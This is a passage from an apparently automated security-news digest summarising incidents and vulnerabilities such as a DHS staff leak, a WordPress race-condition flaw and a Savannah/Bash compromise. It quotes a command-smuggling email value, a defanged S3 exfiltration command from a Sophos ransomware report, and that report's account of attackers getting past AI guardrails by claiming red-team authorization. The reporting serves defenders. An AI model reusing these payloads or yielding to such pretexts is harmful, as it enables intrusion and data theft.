Databases Beyond Migration: Using Database Migration Service for disk shrinking November 2, 2026 Nithin Tomson Database Engineer Adi Shtatfeld Senior Product Manager Nov 4: Agentic Data Cloud Event Join our product leaders to architect your agentic future Register When database engineers hear “database migration", they typically think of a one-time onboarding pathway—moving databases from on-premises environments to the cloud, or between different cloud providers. However, Google Cloud's Database Migration Service (DMS) supports Cloud SQL for SQL Server as a source . This opens up powerful, non-traditional operational patterns for SQL Server customers within Google Cloud. Because DMS enables continuous, low-downtime database replication between Cloud SQL instances—whether in the same project, across different projects, or across regions—it can serve as an everyday utility for day-two operations like storage management. In this post, we explore a compelling operational use case for DMS with Cloud SQL for SQL Server: executing disk shrinks with minimal application downtime. Why should I shrink my disk? In many production environments, database storage only moves in one direction: up. Features like Cloud SQL automatic storage increase are essential for preventing out-of-space outages during unexpected traffic spikes, large batch imports, index maintenance, or temporary staging loads. Similarly, over the lifecycle of an application, you might archive historical records, purge obsolete data, or drop unused indexes. When data is deleted, SQL Server marks the freed space inside your data files (.mdf, .ndf) as reusable for future writes; similarly, log truncation frees up space within transaction log files (.ldf). However, the database files themselves continue to hold their peak used space unless AUTO_SHRINK is configured — a setting that is generally not recommended in production due to severe index fragmentation and performance overhead. With a manual shrink operation on the database files using DBCC SHRINKFILE , you can release that unused space from SQL Server files back to the underlying disk. Even after shrinking the database files, though, the Cloud SQL persistent disk remains at its peak allocated capacity. If you do not expect your database to grow back into that allocated disk space anytime soon, you should consider shrinking the disk itself to reduce ongoing storage costs — especially in scenarios such as: After major data archiving or purging: You have permanently moved historical data to cold storage or BigQuery and your active dataset is now a fraction of its peak size. Recovering from one-time storage spikes: A runaway transaction, large data migration, or temporary staging load triggered storage auto-increase, leaving you paying for terabytes of provisioned disk capacity you no longer need. Post-refactoring or schema optimization: You have split tables out of a monolithic database into separate services, dropped large unused indexes, or applied data compression. The query below allows you to inspect both the allocated capacity and available free space for each database file fo a database: Loading... SELECT DB_NAME() AS [DatabaseName], name AS [LogicalName], type_desc AS [FileType], -- Allocated size on disk (converted from 8KB pages to MB) CAST(size / 128.0 AS DECIMAL(18, 2)) AS [AllocatedSize_MB], -- Actually used space inside the file CAST(FILEPROPERTY(name, 'SpaceUsed') / 128.0 AS DECIMAL(18, 2)) AS [UsedSpace_MB], -- Free space left in the allocated file CAST((size - FILEPROPERTY(name, 'SpaceUsed')) / 128.0 AS DECIMAL(18, 2)) AS [FreeSpace_MB], -- Percentage of allocated space that is used CAST((FILEPROPERTY(name, 'SpaceUsed') * 100.0) / size AS DECIMAL(18, 2)) AS [SpaceUsed_Percent] FROM sys.database_files; You can monitor the following key Cloud SQL metrics in Cloud Monitoring to identify whether your provisioned disk quota significantly exceeds actual disk usage, indicating an opportunity for disk shrinking: da
```

#### Corroborating sources (1)

- **Google Cloud Security** (cloud_identity_infrastructure)
  - Title: Beyond Migration: Using Database Migration Service for disk shrinking
  - Published: 2026-11-02T17:00:00+00:00
  - Link: https://cloud.google.com/blog/products/databases/use-dms-to-shrink-cloud-sql-for-sql-server-disk/
  - Summary: When database engineers hear “database migration", they typically think of a one-time onboarding pathway—moving databases from on-premises environments to the cloud, or between different cloud providers. However, Google Cloud's Database Migration Service (DMS) supports Cloud SQL for SQL Server as a source . This opens up powerful, non-traditional operational patterns for SQL Server customers within Google Cloud. Because DMS enables continuous, low-downtime database replication between Cloud SQL instances—whether in the same project, across different projects, or across regions—it can serve as an everyday utility for day-two operations like storage management. In this post, we explore a compelling operational use case for DMS with Cloud SQL for SQL Server: executing disk shrinks with minimal application downtime. Why should I shrink my disk? In many production environments, database storage only moves in one direction: up. Features like Cloud SQL automatic storage increase are essential

### Cluster 3dc126ab3a — score 9

- Title: Hackers leak personnel data of 41,000+ Homeland Security staff, including ICE and border agents
- Source: Graham Cluley (practitioner_analysis)
- Published: 2026-10-30T10:33:50+00:00
- Link: https://www.bitdefender.com/en-us/blog/hotforsecurity/hackers-leak-41-000-dhs-staff-data
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, phishing_social_eng
- affected_industries: government
- affected_products: Okta
- content_type: incident_report
- confidence_tier: tier_3_analysis

#### Primary article taxonomy
- threat_categories: phishing_social_eng, data_breach
- affected_industries: government
- affected_products: Okta
- content_type: incident_report
- confidence_tier: tier_3_analysis

#### Summary

```
The US Department of Homeland Security has had the details of more than 41,000 staff, including ICE and CBP agents, published online. Not ideal for an organisation with "Security" in its name. Read more in my article on the Hot for Security blog.
```

#### Full body

```
Industry News Data Breach 2 min read Hackers leak personnel data of 41,000+ Homeland Security staff, including ICE and border agents Graham CLULEY October 30, 2026 More than 41,000 people working for the US Department of Homeland Security, including ICE agents, have had their details published online by a group of hacktivists. As TechCrunch reports , the leaked records include the names, job titles, work email addresses, phone numbers, abd office locations. More than half of the leaked records relate to US Customs and Border Protection (CBP) employees, typically found at airports, seaports, and land border crossings. Around 10,000 ICE employees have had their records breached, and almost 1,000 members of the Cybersecurity and Infrastructure Security Agency (CISA). WIRED reports that the massive leak includes staff who work undercover, as well as in other sensitive areas such as those engaged in wiretapping and the interception of communications. A hacktivist group calling itself "Department of Peace" says that the data was taken from an Okta single sign-on system that staff use to log onto the central network of the US Department of Homeland Security. Okta for its part says that it has not seen any evidence that its own systems have been compromised. The data reveals which tools and services particularly individuals can access. Alongside everyday office software, these include Palantir's Falcon investigative platform, the phone and social media analysis tool PenLink, and Mobile Fortify, a facial recognition app used by immigration agents. Explaining its justification for the data breach, "Department of Peace" wrote: "They have our information, so it’s only fair that we have theirs." The leaked data has been published online, under the title "Icepick", and can be either downloaded via a torrent or accessed via a web interface - making it significantly easier for curious parties to search. One threat intelligence expert told WIRED that, if authentic, the leaked data was "an extraordinarily valuable intelligence resource for those seeking to penetrate DHS," and could help adversaries identify vulnerable personnel or compromise ongoing investigations. An obvious concern is that the leaked contact details could be used in phishing attacks that target employees, or could potentially put agents in physical danger. Clearly anyone whose details have been exposed through the incident would be wise to treat unexpected emails, texts, and phone calls with caution - and be particularly wary of any communications that claim to come from IT support or ask for a login to be approved. Earlier this year the same group of hacktivists claimed to have breached the US Department of Homeland Security and accessed contracts between DHS, ICE, and more than 6000 firms including the likes of L3Harris, Raytheon, Palantir, Microsoft, and Oracle. Explaining their motivation for that breach, the hackers referred to the killings of Alex Pretti and Renée Good by federal agents in Minneapolis. "Why hack the DHS? I can think of a couple Pretti Good reasons! I'm releasing this because the DHS is killing us and people deserve to know which companies support them and what they're working on." There has been a long string of cybersecurity incidents affecting US government personnel. For instance, in September the notorious ShinyHunters hacking group claimed to have stolen personal details related to nearly every employee of the FBI, and the records of millions of serving and former US military personnel were reportedly stolen from the Pentagon's human resources unit. tags Industry News Data Breach Author Graham CLULEY Graham Cluley is an award-winning security blogger, researcher and public speaker. He has been working in the computer security industry since the early 1990s. View all posts You might also like Bookmarks
```

#### Corroborating sources (1)

- **Graham Cluley** (practitioner_analysis)
  - Title: Hackers leak personnel data of 41,000+ Homeland Security staff, including ICE and border agents
  - Published: 2026-10-30T10:33:50+00:00
  - Link: https://www.bitdefender.com/en-us/blog/hotforsecurity/hackers-leak-41-000-dhs-staff-data
  - Summary: The US Department of Homeland Security has had the details of more than 41,000 staff, including ICE and CBP agents, published online. Not ideal for an organisation with "Security" in its name. Read more in my article on the Hot for Security blog.

### Cluster 277a028510 — score 9

- Title: Securing Internet-Critical Software: How We Could Have Backdoored Bash
- Source: Reddit r/netsec (reddit_practitioner_osint)
- Published: 2026-11-02T09:43:15+00:00
- Link: https://www.reddit.com/r/netsec/comments/1xlsxqk/securing_internetcritical_software_how_we_could/
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_5_chatter

#### Primary article taxonomy
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_5_chatter

#### Summary

```
(May 2026) TL;DR: an email address like atouch${IFS}/tmp/ savane-rce-proof@attacker.example gave any registered user code execution on its backend. From there, we made our account a superuser, impersonated Bash’s maintainer, and confirmed we could add an SSH key with push access to the upstream Bash repository. An unpatched kernel gave us root access and access to a GNU backup server. We reported it to the FSF on May 11, 2026. FSF incident report: https://static.fsf.org/nosvn/security/savannah-20260807.pdf submitted by /u/gainan [link] [comments]
```

#### Corroborating sources (1)

- **Reddit r/netsec** (reddit_practitioner_osint)
  - Title: Securing Internet-Critical Software: How We Could Have Backdoored Bash
  - Published: 2026-11-02T09:43:15+00:00
  - Link: https://www.reddit.com/r/netsec/comments/1xlsxqk/securing_internetcritical_software_how_we_could/
  - Summary: (May 2026) TL;DR: an email address like atouch${IFS}/tmp/ savane-rce-proof@attacker.example gave any registered user code execution on its backend. From there, we made our account a superuser, impersonated Bash’s maintainer, and confirmed we could add an SSH key with push access to the upstream Bash repository. An unpatched kernel gave us root access and access to a GNU backup server. We reported it to the FSF on May 11, 2026. FSF incident report: https://static.fsf.org/nosvn/security/savannah-20260807.pdf submitted by /u/gainan [link] [comments]

### Cluster d797e0f3c5 — score 9

- Title: Mirage2FA stole 4,561 M365 session cookies despite MFA via AiTM proxy (CVE-2026-69836 CVSS 10.0) : detection rules and WHfB/Cloud Kerberos Trust hardening guide
- Source: Reddit r/netsec (reddit_practitioner_osint)
- Published: 2026-11-01T10:15:16+00:00
- Link: https://www.reddit.com/r/netsec/comments/1xkzjb0/mirage2fa_stole_4561_m365_session_cookies_despite/
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-69836

#### Cluster taxonomy (union across members)
- threat_categories: mfa_bypass
- cve_ids: CVE-2026-69836
- urgency_signals: critical_cvss
- content_type: vulnerability_disclosure
- confidence_tier: tier_5_chatter

#### Primary article taxonomy
- threat_categories: mfa_bypass
- cve_ids: CVE-2026-69836
- urgency_signals: critical_cvss
- content_type: vulnerability_disclosure
- confidence_tier: tier_5_chatter

#### Summary

```
submitted by /u/doit4everyone [link] [comments]
```

#### Corroborating sources (1)

- **Reddit r/netsec** (reddit_practitioner_osint)
  - Title: Mirage2FA stole 4,561 M365 session cookies despite MFA via AiTM proxy (CVE-2026-69836 CVSS 10.0) : detection rules and WHfB/Cloud Kerberos Trust hardening guide
  - Published: 2026-11-01T10:15:16+00:00
  - Link: https://www.reddit.com/r/netsec/comments/1xkzjb0/mirage2fa_stole_4561_m365_session_cookies_despite/
  - Summary: submitted by /u/doit4everyone [link] [comments]

### Cluster fcee7a9b28 — score 9

- Title: TeamViewer RCE Vulnerability (CVE-2026-11585)
- Source: Reddit r/netsec (reddit_practitioner_osint)
- Published: 2026-10-29T14:07:38+00:00
- Link: https://www.reddit.com/r/netsec/comments/1xikzuw/teamviewer_rce_vulnerability_cve202611585/
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-11585

#### Cluster taxonomy (union across members)
- cve_ids: CVE-2026-11585
- content_type: vulnerability_disclosure
- confidence_tier: tier_5_chatter

#### Primary article taxonomy
- cve_ids: CVE-2026-11585
- content_type: vulnerability_disclosure
- confidence_tier: tier_5_chatter

#### Summary

```
submitted by /u/NewResearch1337 [link] [comments]
```

#### Corroborating sources (1)

- **Reddit r/netsec** (reddit_practitioner_osint)
  - Title: TeamViewer RCE Vulnerability (CVE-2026-11585)
  - Published: 2026-10-29T14:07:38+00:00
  - Link: https://www.reddit.com/r/netsec/comments/1xikzuw/teamviewer_rce_vulnerability_cve202611585/
  - Summary: submitted by /u/NewResearch1337 [link] [comments]

### Cluster 5cefe132d9 — score 9

- Title: Axis Camera Station Deep-Dive: Unauth RCE to Decrypting Every Camera Credential (CVE-2025-30026/30023 + CVE-2026-63286)
- Source: Reddit r/netsec (reddit_practitioner_osint)
- Published: 2026-10-29T08:45:46+00:00
- Link: https://www.reddit.com/r/netsec/comments/1xiekai/axis_camera_station_deepdive_unauth_rce_to/
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2025-30026, CVE-2026-63286

#### Cluster taxonomy (union across members)
- cve_ids: CVE-2025-30026, CVE-2026-63286
- content_type: vulnerability_disclosure
- confidence_tier: tier_5_chatter

#### Primary article taxonomy
- cve_ids: CVE-2025-30026, CVE-2026-63286
- content_type: vulnerability_disclosure
- confidence_tier: tier_5_chatter

#### Summary

```
submitted by /u/Rare_Bicycle_5705 [link] [comments]
```

#### Corroborating sources (1)

- **Reddit r/netsec** (reddit_practitioner_osint)
  - Title: Axis Camera Station Deep-Dive: Unauth RCE to Decrypting Every Camera Credential (CVE-2025-30026/30023 + CVE-2026-63286)
  - Published: 2026-10-29T08:45:46+00:00
  - Link: https://www.reddit.com/r/netsec/comments/1xiekai/axis_camera_station_deepdive_unauth_rce_to/
  - Summary: submitted by /u/Rare_Bicycle_5705 [link] [comments]

### Cluster 31d233a8e7 — score 9

- Title: WordPress RCE Flaw Draws Nearly 63,000 Attack Attempts in Just 24 Hours
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-10-30T14:08:14+00:00
- Link: https://thehackernews.com/2026/10/wordpress-rce-flaw-draws-nearly-63000.html
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: WordPress

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, credential_theft, web_shell_backdoor, zero_day
- affected_industries: financial_services
- affected_products: GitHub, Linux kernel, WordPress
- urgency_signals: actively_exploited, preauth_unauth, zero_day
- content_type: news_report
- confidence_tier: tier_4_news, tier_5_chatter

#### Primary article taxonomy
- threat_categories: credential_theft, zero_day, web_shell_backdoor, active_exploitation
- affected_industries: financial_services
- affected_products: WordPress, GitHub, Linux kernel
- urgency_signals: actively_exploited, zero_day, preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Threat actors have been observed attempting to exploit a high-severity security flaw in WordPress Core shortly after patches were released. The vulnerability, which does not have a CVE identifier, relates to a case of remote code execution impacting WordPress Core versions 4.7 through 7.1.3. It carries a CVSS score of 8.1 on the CVSS scoring system. Patches for the flaw were released on October
```

#### Full body

```
WordPress RCE Flaw Draws Nearly 63,000 Attack Attempts in Just 24 Hours  Ravie Lakshmanan  Oct 30, 2026 Vulnerability / Web Security Threat actors have been observed attempting to exploit a high-severity security flaw in WordPress Core shortly after patches were released. The vulnerability , which does not have a CVE identifier, relates to a case of remote code execution impacting WordPress Core versions 4.7 through 7.1.3. It carries a CVSS score of 8.1 on the CVSS scoring system. Patches for the flaw were released on October 28, 2026. "This is due to predictable, web-accessible staging paths used during full-package core upgrades," Wordfence said . "This makes it possible for unauthenticated attackers to execute code on the server during the upgrade window." The WordPress security company noted that successful exploitation requires an "attacker to hit a very narrow window while WordPress is unpacking a complete Core update." The issue boils down to the fact that affected versions unpack new files part of a full-package Core update into a predictable directory under "wp-content/upgrade." This copy also includes the WordPress installer. "Because the staging directory is web-accessible on many servers, an unauthenticated attacker who requests the installer at precisely the right moment can interact with the staged WordPress copy and progress to PHP code execution," Alex Thomas, who leads the Wordfence Threat Response Team, said. A threat actor who is able to win the race condition can gain the ability to execute code on the server, assuming the following conditions are met - A full-package update containing the installer files Public web and PHP access to the staging tree A predictable or discovered staging path, and Adequate time to complete the attack before WordPress cleans up the temporary files Although that window has been observed to last only seconds in normal lab environments, threat actors are polling vulnerable paths, such as "setup-config.php," repeatedly in an attempt to trigger the flaw. Over the past 24 hours, Wordfence said it has blocked 62,969 attacks targeting the vulnerability. "Two of the largest sources repeatedly polled small groups of sites for roughly 14.5 hours, behavior consistent with trying to catch the brief upgrade window," Thomas said. "Other sources tested many staging-directory and version-name variations." "Not every request used the exact vulnerable path, but the sustained polling and exact-layout probes show that attackers quickly understood the race condition and began targeting it." With active exploitation attempts already underway, WordPress site owners are advised to update to version 7.1.4 as soon as possible and look for suspicious requests to PHP files located under "wp-content/upgrade," as well as unfamiliar administrator accounts, plugins, or PHP files. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  Cyber Attack , Vulnerability , Web Security , WordPress ⚡ Top Stories This Week Leaked LiteLLM Master Key Let Attackers Steal GitHub Tokens and Hijack Release Pipeline Chinese Hackers Use AI-Powered ARTEX to Target Over 200 Organizations Worldwide TeamViewer Flaw Lets Remote Computers Attack Users Who Connect to Control Them Official Claude Code Extension on Cursor Marketplace Trojanized with Persistent SSH Backdoor Binance Suffers Security Breach Affecting $6.3 Billion in Assets, Nearly $3 Billion Frozen ThreatsDay: Critical Firewall Flaws, Banking Trojans Rented, Weaponized PDF, Token Theft + 26 More Stories Linux Kernel TCP Flaw With 9.8 CVSS Score Affects Ubuntu, Red Hat and Other Distributions Cisco Patches Actively Exploited ASA and FTD VPN Flaw That Can Crash Firewalls China-Linked Hackers Exploited VMware ESX Zero-Day to Reduce Audit Trail Visibility Attackers Exploit PHP2Shell Flaws in Internet-Exposed Palo Alto Networks Management Interfaces PHP2Shell
```

#### Corroborating sources (2)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: WordPress RCE Flaw Draws Nearly 63,000 Attack Attempts in Just 24 Hours
  - Published: 2026-10-30T14:08:14+00:00
  - Link: https://thehackernews.com/2026/10/wordpress-rce-flaw-draws-nearly-63000.html
  - Summary: Threat actors have been observed attempting to exploit a high-severity security flaw in WordPress Core shortly after patches were released. The vulnerability, which does not have a CVE identifier, relates to a case of remote code execution impacting WordPress Core versions 4.7 through 7.1.3. It carries a CVSS score of 8.1 on the CVSS scoring system. Patches for the flaw were released on October
- **Reddit r/netsec** (reddit_practitioner_osint)
  - Title: WordPress pingback and Brotli RCE
  - Published: 2026-11-02T09:11:50+00:00
  - Link: https://www.reddit.com/r/netsec/comments/1xlsgc8/wordpress_pingback_and_brotli_rce/
  - Summary: submitted by /u/adrian_rt [link] [comments]

### Cluster 9389bbe24e — score 8

- Title: John Strand's 11 Core Skills: For SOC Analysts
- Source: Black Hills Information Security (detection_response_operations)
- Published: 2026-10-28T20:27:36+00:00
- Link: https://www.blackhillsinfosec.com/soc-core-skills/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
The cybersecurity battlefield evolves daily, with SOC analysts serving as front-line defenders. After years of training SOC teams, I’ve identified 11 core skills that separate effective defenders from the rest.
```

#### Full body

```
This article was originally published in the InfoSec Survival Guide: Blue Book — SOC Analysts. Read it free online HERE , or grab it on the Spearphish General Store (free digital download or a $1.25 physical copy, your call). The cybersecurity battlefield evolves daily, with SOC analysts serving as front-line defenders. After years of training SOC teams, I’ve identified 11 core skills that separate effective defenders from the rest. Here’s the problem: we’re training analysts to look for needles in haystacks when they don’t even know what hay looks like. Too many enter SOC positions without understanding the systems they’re trying to protect. 1. Understanding Operating Systems You can’t defend what you don’t understand. Period. Master both Windows and Linux. Not just surface stuff, but really get how they work under the hood. Learn through the incident response lens:”If this system were hacked, how would I find the bad guys?” 2. Network Traffic Analysis Understand TCP/IP and how traffic actually flows (the OSI model matters less than knowing what a SYN flood, DNS tunnel, or C2 beacon looks like on the wire). Know the difference between TCP and UDP, and establish baselines for what normal traffic looks like in your environment. 3. Memory Analysis Memory forensics shows you malware that might be invisible on disk. Tools like Volatility let you examine processes, connections, and DLLs from a memory dump. This works even when attackers delete their tools or use fileless malware. It’s like catching someone with their hand in the cookie jar. 4. Log Analysis Logs are your investigative breadcrumbs. Know which ones to collect and how to make sense of them. Remember, no single log tells the whole story. You need to connect multiple data points, like a detective piecing together clues at a crime scene. 5. Endpoint Detection and Response Master your EDR solutions. Understand how they work, what they can do, and where they fall short. No EDR catches everything. You need to tune these tools, like adjusting the sights on a rifle for better accuracy. 6. Threat Hunting Don’t just sit back waiting for alerts. Get out there and hunt! Look for threats that slipped past your automated systems. Combine smart hypotheses with data analysis to find attackers living off the land, using legitimate tools for evil purposes. 7. Malware Analysis Every SOC analyst should know basic static and dynamic analysis. Look at the file without running it, then observe its behavior in a safe sandbox. Learn to spot common techniques like obfuscation and persistence. Know thy enemy, right? 8. Vulnerability Management Understand different vulnerability types and how they’re exploited. Don’t just focus on CVSS scores. Consider actual exploitability in your environment and the potential impact. A “critical” vulnerability that can’t actually be exploited in your environment isn’t critical for you. 9. Incident Response When stuff hits the fan, know what to do. Identify what happened, contain it, kick out the attackers, and recover your systems. Document everything. Not just for compliance, but so your team can learn and improve. 10. Automation and Scripting Automate the boring stuff with PowerShell, Python, or Bash. Create tools that do the repetitive work for you. This frees you up to focus on the complex problems that need human brainpower. 11. Communication and Documentation Technical skills alone won’t cut it. You need to explain complex technical stuff to different audiences. The most brilliant analysis in the world is useless if you can’t make the bosses understand why they should care. Conclusion Mastering these skills won’t happen overnight, but they’re the foundation of being an effective SOC analyst. What makes great analysts stand out isn’t just knowing individual skills but connecting dots across domains: seeing how network traffic ties to endpoint behavior, when log weirdness might point to memory-resident malware, and how vulnerabilities create openings for at
```

#### Corroborating sources (1)

- **Black Hills Information Security** (detection_response_operations)
  - Title: John Strand's 11 Core Skills: For SOC Analysts
  - Published: 2026-10-28T20:27:36+00:00
  - Link: https://www.blackhillsinfosec.com/soc-core-skills/
  - Summary: The cybersecurity battlefield evolves daily, with SOC analysts serving as front-line defenders. After years of training SOC teams, I’ve identified 11 core skills that separate effective defenders from the rest.

### Cluster bbd7b85247 — score 8

- Title: AI used in Aur0ra ransomware testing and execution
- Source: Sophos X-Ops (detection_response_operations)
- Published: 2026-10-29T00:00:00+00:00
- Link: https://www.sophos.com/en-us/blog/ai-used-in-aur0ra-ransomware-testing-and-execution
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, ransomware_extortion
- affected_products: Anthropic/Claude
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: ransomware_extortion, data_breach
- affected_products: Anthropic/Claude
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
The GOLD OGRE threat group has used AI extensively to develop tools and to orchestrate and execute ransomware operations Categories: Threat Research Tags: AI, Ransomware, Aur0ra
```

#### Full body

```
AI used in Aur0ra ransomware testing and execution The GOLD OGRE threat group has used AI extensively to develop tools and to orchestrate and execute ransomware operations Written by Sophos Counter Threat Unit Research Team , Colin Cowie Threat Research AI Ransomware Aur0ra Share This Link Copied In May 2026, Counter Threat Unit™ (CTU) researchers published a report on an AI-assisted post-exploitation framework that tested the capabilities of multiple vendors’ endpoint detection and response (EDR) solutions, including the Sophos agent. Following a testing phase, Sophos analysts observed the same infrastructure hosting Cobalt Strike in support of Aur0ra ransomware (also known as Aurora ransomware) operations. Sophos analysis has revealed that the GOLD OGRE cybercriminal group, which operates Aur0ra ransomware, extensively uses AI to conduct attacks. The tools and tactics, techniques, and procedures (TTPs) observed by Sophos analysts align with third-party reporting of AI usage in similar compromises. Sophos analysis While investigating the exploitation framework, which was developed with Cursor AI assistance, Sophos analysts gained visibility that provided insights into the Aur0ra ransomware operation. They confirmed routine use of Cobalt Strike for intrusions, S3-compatible storage for storing stolen data, and agentic AI to escalate from credential access to privileged accounts. Sophos immediately notified potentially impacted customers and worked with law enforcement to issue notifications for other affected organizations. The research data revealed multiple distinct operators, but each followed the same attack pattern. This pattern involved using shared command and control (C2) infrastructure and toolkits to perform Active Directory (AD) enumeration and lateral movement, focusing on network shares to collect data. For example, across multiple attacks, one operator conducted privilege escalation, process injection, credential/token abuse, extensive AD and share enumeration via SharpShares; collected the resulting data; and performed file-transfer activity consistent with staging and exfiltration to an S3 bucket: VeeamTransport --endpoint-url hxxp://152[.]236[.]4[.]14:54410 ... cp ... s3://devhost/ <redacted> /... Artifacts discovered in the data suggest the operators are Russian speakers. Russian commands “зы” and “ды”, which were observed in the operator logs, correspond to ps (process enumeration) and ls (directory enumeration) when transposed from a Cyrillic keyboard layout. In late August, Sophos analysts recovered Cursor artifacts associated with Aur0ra ransomware operations and EDR evasion testing. The threat actors used Cursor to escalate from credential access to domain administrator in preparation for data collection and ransomware deployment. AI guardrails were bypassed by framing the intrusions as authorized red team activity or "diagnostics testing". Intrusions were orchestrated by Cursor's Composer agentic coding model as well as AI models provided by Anthropic, xAI, and Moonshot. Analysis indicates that the threat actors initially used Anthropic almost exclusively but then introduced other models. The shift may be related to the threat actors’ objectives, as they transitioned from building tools to conducting intrusions. Figure 1 shows the typical workflow. Human operators supplied VPN credentials, SOCKS access, targets, and objectives to the agents. The agents then performed network and AD discovery tasks, analyzed credential-based attack paths, executed commands, and moved laterally with limited human involvement. In several environments, the agents searched network shares, user documents, backup repositories, and cloud-connected storage while conducting password spraying, Kerberoasting, NTLM coercion and relay, and credential extraction from files and backups. In a subset of environments, agents achieved domain management access. Three of these victims were later named on Aur0ra’s data leak site. Figure 1: AI
```

#### Corroborating sources (1)

- **Sophos X-Ops** (detection_response_operations)
  - Title: AI used in Aur0ra ransomware testing and execution
  - Published: 2026-10-29T00:00:00+00:00
  - Link: https://www.sophos.com/en-us/blog/ai-used-in-aur0ra-ransomware-testing-and-execution
  - Summary: The GOLD OGRE threat group has used AI extensively to develop tools and to orchestrate and execute ransomware operations Categories: Threat Research Tags: AI, Ransomware, Aur0ra

### Cluster 09e69960c3 — score 8

- Title: Reports of SIEM's Death Have Been Greatly Exaggerated
- Source: Huntress (detection_response_operations)
- Published: 2026-10-29T14:00:00+00:00
- Link: https://www.huntress.com/blog/reports-that-siem-is-dead-are-exaggerated
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
SIEM isn't dead. Its bloated pricing model is. Discover why legacy pricing models need to go, how AI fits in, and how to build a smarter, cost-effective security logging strategy.
```

#### Full body

```
Home Blog Reports of SIEM's Death Have Been Greatly Exaggerated Published: October 29, 2026 Reports of SIEM's Death Have Been Greatly Exaggerated By: Ben Bernstein Summarize with AI Summarize ChatGPT Claude Perplexity Google AI There's a phrase I keep hearing in cyber circles lately, at in-person conferences, on LinkedIn, pretty much everywhere: "SIEM is dead." I get why it's catchy. But SIEM has died more times than a soap opera villain, and it keeps showing up for next season. Before SIEM, it was the perimeter that was dead. Then antivirus. Then passwords. ( Passkeys are coming for them , but plenty are still living on sticky notes under keyboards.) Here's where I land: the way a lot of companies have been buying and feeding their SIEM deserves to go away. SIEM itself doesn't. So before anyone orders flowers, let's look at what's actually changing. Follow the money (and the marketing) There's so much cybersecurity marketing out there that it's hard to tell which tools and controls matter against today's threats. Every booth on the expo floor has "AI" printed on it somewhere. Some of it is impressive. Some of it is a chatbot wearing a trench coat. "X is dead" is about the oldest trick in the marketing book. If the old category is dead, you'd better buy the new one. It makes for a great keynote slide. It also skips the question I'd want answered first: what was the old thing doing for us, and do we still need that done? For SIEM, the job was visibility across the environment, catching attackers, running investigations, and keeping records for compliance. Attackers are still here. So are auditors. The open question is whether there's a smarter way to do it . The "send it all" era For years, the big legacy players (think Splunk and QRadar) priced on how much data you ingested and how much you stored. That model let them charge what they charged. And the advice that came with it was always the same: send everything. Firewall logs, DNS queries, DHCP renewals, every time a printer had feelings. Get it all in, and figure out what's useful later. Later almost never came. What came instead was a giant bill, a pile of alerts nobody had time for, and a very expensive junk drawer. If your vendor makes more money every time you send another log, of course they'll tell you to send more. The market has caught on. Cisco bought Splunk, and IBM sold its QRadar SaaS business to Palo Alto Networks. When the biggest names in a category start changing hands, something is shifting. Enter the AI-native challengers That market shake-up opened the door for a wave of AI-native SIEMs and security data lakes. The newest pitch I keep hearing goes something like: "Why store everything yourself? Leave the logs where they are. Our AI will call your sources' APIs, pull what it needs on demand, and only keep the signals that matter." I'll be fair. That sounds great, and some of the thinking behind it is smart. Nobody enjoys paying to store terabytes of noise, and using AI to pick out signal is a useful idea. The problem is the bill. You swapped a storage bill for a token bill When AI is querying everything on demand, you're still paying. You've just moved the cost from storage to compute, specifically the tokens it takes to pull, parse, and reason over that data each time. During an active incident, when you're firing off question after question, that meter moves fast. It's like cutting the cable bill and then signing up for nine streaming services. Also, tokens right now are about as cheap and subsidized as they'll ever be. AI providers are pricing to win market share, and that won't last. We've been here before: Moving everything to the cloud was going to save us all a fortune, remember? For plenty of companies it did, right up until the egress fees and surprise invoices showed up and someone had to go hire a FinOps team. Prices settled at their real level. I expect AI inference to follow a similar path. Cost isn't the only catch, either: Retention: If the s
```

#### Corroborating sources (1)

- **Huntress** (detection_response_operations)
  - Title: Reports of SIEM's Death Have Been Greatly Exaggerated
  - Published: 2026-10-29T14:00:00+00:00
  - Link: https://www.huntress.com/blog/reports-that-siem-is-dead-are-exaggerated
  - Summary: SIEM isn't dead. Its bloated pricing model is. Discover why legacy pricing models need to go, how AI fits in, and how to build a smarter, cost-effective security logging strategy.

### Cluster 59aab6cd86 — score 8

- Title: Managed for Malice: How Attackers Turn MDM into Remote Access
- Source: Huntress (detection_response_operations)
- Published: 2026-10-28T16:00:00+00:00
- Link: https://www.huntress.com/blog/attackers-turn-mdm-into-remote-access
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng
- affected_products: Anthropic/Claude, OpenAI/ChatGPT, ScreenConnect
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: phishing_social_eng
- affected_products: ScreenConnect, Anthropic/Claude, OpenAI/ChatGPT
- content_type: news_report
